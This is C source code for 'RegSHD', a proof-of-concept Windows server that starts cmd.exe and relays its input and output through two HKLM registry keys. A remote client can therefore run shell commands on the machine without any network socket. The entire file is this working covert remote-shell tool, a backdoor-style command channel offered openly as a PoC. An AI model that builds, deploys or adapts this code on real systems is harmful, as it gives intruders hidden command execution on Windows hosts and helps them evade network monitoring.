/**
 * Copyright (c) 2014 @cmpxchg8
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, 
 * MA  02111-1307 USA
 * 
 * http://www.gnu.org/licenses/gpl-2.0.txt
 * 
 */
#define APP_NAME     "RegSHD"
#define APP_VERSION  "0.1"
#define AUTHOR_EMAIL "cmpxchg8"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>

#include <windows.h>

#pragma comment (lib, "advapi32.lib")

#define STDINPUT_KEY  "SOFTWARE\\REGSH\\hStdInput"     // reads from here
#define STDOUTPUT_KEY "SOFTWARE\\REGSH\\hStdOutput"    // writes to here

#define MAX_EVENTS 5   // in, out, complete, terminate, interrupt

#define REG_READ            0
#define REG_WRITE           1
#define REG_COMPLETE        2
#define PROCESS_CLOSED      3
#define PROCESS_INTERRUPTED 4

HANDLE ge[MAX_EVENTS];
HKEY k[2];
int verbose=0;

#define WDEBUG vout

void vout (const char fmt[], ...) {
  va_list arglist;
  char    buffer[2048];

  if (verbose == 0) return;

  va_start (arglist, fmt);
  vsnprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);

  fprintf (stdout, "\n  [*] %s", buffer);
}

void xstrerror (const char fmt[], ...) {
  char    *error;
  va_list arglist;
  char    buffer[2048];
  
  va_start (arglist, fmt);
  vsnprintf (buffer, sizeof (buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  FormatMessage (
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, GetLastError (), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
      (LPSTR)&error, 0, NULL);

  fprintf (stdout, "  %s : %s\n", buffer, error);
  LocalFree (error);
}

const char *lpszEvents[5] = 
{ "Command", 
  "Client received output", 
  "Standard Output waiting", 
  "Process closed", 
  "Process interrupted" };

void run_cmd (void) {
  SECURITY_ATTRIBUTES sa;
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  OVERLAPPED          lap;

  BYTE                in[BUFSIZ], out[BUFSIZ], tmp[BUFSIZ];
  HANDLE              lh[4];
  DWORD               rp, rn, wp, wn, tn, i;
  LONG                lRes;
  
  WDEBUG ("Creating anonymous pipe for hStdInput");

  sa.nLength              = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = NULL;
  sa.bInheritHandle       = TRUE;

  if (CreatePipe (&lh[0], &lh[1], &sa, 0))
  {
    WDEBUG ("Creating named pipe for hStdOutput and hStdError");

    lh[2] = CreateNamedPipe ("\\\\.\\pipe\\1",
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE     | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);

    if (lh[2] != INVALID_HANDLE_VALUE)
    {
      WDEBUG ("Opening named pipe for hStdOutput and hStdError");

      lh[3] = CreateFile ("\\\\.\\pipe\\1", MAXIMUM_ALLOWED,
          0, &sa, OPEN_EXISTING, 0, NULL);

      if (lh[3] != INVALID_HANDLE_VALUE)
      {
        ZeroMemory (&si, sizeof (si));
        ZeroMemory (&pi, sizeof (pi));

        si.cb          = sizeof (si);
        si.hStdInput   = lh[0];
        si.hStdError   = lh[3];
        si.hStdOutput  = lh[3];
        si.wShowWindow = SW_SHOWDEFAULT;
        si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

        WDEBUG ("Creating cmd process");

        if (CreateProcess (NULL, "cmd", NULL, NULL, TRUE,
            0, NULL, NULL, &si, &pi))
        {
          ge[PROCESS_CLOSED] = pi.hProcess;

          ZeroMemory (&lap, sizeof (lap));
          lap.hEvent = ge[REG_COMPLETE];

          rp = 0;
          wp = 0;

          while (1)
          {            
            // read input from remote client
            if (wp == 0)
            {
              RegNotifyChangeKeyValue (k[0], TRUE, 
                  REG_NOTIFY_CHANGE_LAST_SET, ge[0], TRUE);
              wp++; // we're waiting for command
            }
            
            // now wait for an event
            WDEBUG ("Waiting for events");

            i = WaitForMultipleObjects (MAX_EVENTS, ge,
                FALSE, INFINITE) - WAIT_OBJECT_0;

            WDEBUG ("Event: %s\n", i < MAX_EVENTS ? lpszEvents[i] : "oops");
            
            // is this a command?
            if (i == REG_READ)
            {
              WDEBUG ("Reading from Registry::hStdInput");
              wn = BUFSIZ;
              ZeroMemory (in, BUFSIZ);
              lRes = RegQueryValueEx (k[0], NULL, NULL, NULL, in, &wn);
              if (lRes == ERROR_SUCCESS)
              {
                WDEBUG ("Clearing Registry::hStdInput on error %i", lRes);
                lRes = RegDeleteValue (k[0], NULL);   // this will notify remote client we processed command
                WDEBUG ("Writing %i bytes : \"%s\" to hStdInput", wn, in);
                if (strnicmp ("exit", (char*)in, 4) == 0) break;
                WriteFile (lh[1], in, wn, &i, 0);
              }
              wp = 0;   // wait for another command
            } else
            
            // data from hStdOutput or hStdError is waiting to be read
            if (i == REG_COMPLETE)
            {
              // read from hStdOutput of cmd.exe
              if (rp == 0)
              {
                ZeroMemory (out, BUFSIZ);
                rn = 0;
                ReadFile (lh[2], out, BUFSIZ, &rn, &lap);
                rp++; // we're waiting for output
              } else 
              
              //if (rp == 1) 
              {
                // if read is not pending, go ahead and get result
                WDEBUG ("Getting overlapped result");

                if (!GetOverlappedResult (lh[2], &lap, &rn, FALSE)) {
                  WDEBUG ("GetOverlappedResult() failed");
                  break;
                }

                // any data?
                if (rn != 0)
                {                  
                  // first event will be the write we just made
                  RegNotifyChangeKeyValue (k[1], TRUE, 
                    REG_NOTIFY_CHANGE_LAST_SET, ge[1], TRUE);
                    
                  WDEBUG ("Writing \"%s\" bytes of to registry", out);
                  RegSetValueEx (k[1], NULL, NULL, REG_BINARY, out, rn);
                  
                  // wait until it's read before continuing
                  WDEBUG ("Waiting for read");
                  WaitForSingleObject (ge[1], INFINITE);
                  rp--;
                  
                  // second will be for deletion
                  RegNotifyChangeKeyValue (k[1], TRUE, 
                    REG_NOTIFY_CHANGE_LAST_SET, ge[1], TRUE);
                    
                  WDEBUG ("Waiting for deletion");
                  WaitForSingleObject (ge[1], INFINITE);
                }
              }
            } else
            if (i == PROCESS_CLOSED)
            {
              WDEBUG ("cmd.exe closed");
              break;
            } else
            if (i == PROCESS_INTERRUPTED)
            {
              WDEBUG ("Process interrupted");
              break;
            }
          }
          TerminateProcess (pi.hProcess, 0);

          CloseHandle (pi.hThread);
          CloseHandle (pi.hProcess);
        }
        CloseHandle (lh[3]);
      }
      CloseHandle (lh[2]);
    }
    CloseHandle (lh[1]);
    CloseHandle (lh[0]);
  }
}


void run_server (void)
{
  const char        *subkey[2] = {STDINPUT_KEY, STDOUTPUT_KEY};
  int               i;
  LONG              lRes;
  BOOL              bError=FALSE;
  
  for (i=0; i<2; i++)
  {
    // open key
    lRes = RegCreateKeyEx (HKEY_LOCAL_MACHINE, 
        subkey[i], 0, NULL, 0, KEY_WRITE | KEY_NOTIFY | KEY_READ, 
        NULL, &k[i], NULL);
        
    if (lRes == ERROR_SUCCESS)
    {
      // create event
      ge[i] = CreateEvent (NULL, FALSE, FALSE, NULL);
      if (ge[i] == NULL)
      {
        bError = TRUE;
        xstrerror ("CreateEvent()");
        break;
      }
    } else {
      xstrerror ("RegCreateKeyEx()");
    }
  }
  // if no error, run
  if (!bError)
  {
    ge[REG_COMPLETE]        = CreateEvent (NULL, TRUE, TRUE, NULL);
    ge[PROCESS_INTERRUPTED] = CreateEvent (NULL, TRUE, FALSE, NULL);
    
    run_cmd ();
    
    CloseHandle (ge[REG_COMPLETE]);
    CloseHandle (ge[PROCESS_INTERRUPTED]);
  }
  // clean up
  for (i=0; i<2; i++)
  {
    CloseHandle (ge[i]);
    RegCloseKey (k[i]);
  }
}

void main(int argc, char *argv[])
{
  char *address=NULL;
  int i;
  char opt;
  
  printf ("\n  Registry Shell PoC Server v"APP_VERSION
      "\n  Copyright (c) 2014 "AUTHOR_EMAIL"\n\n");
  
  for (i = 1; i < argc; i++) {
    if (argv[i][0] == '/' || argv[i][0] == '-') {
      opt = argv[i][1];
      switch (opt) {
        case 'v' : {
          verbose = 1;
          break;
        }
      }
    }
  }
  run_server ();
}
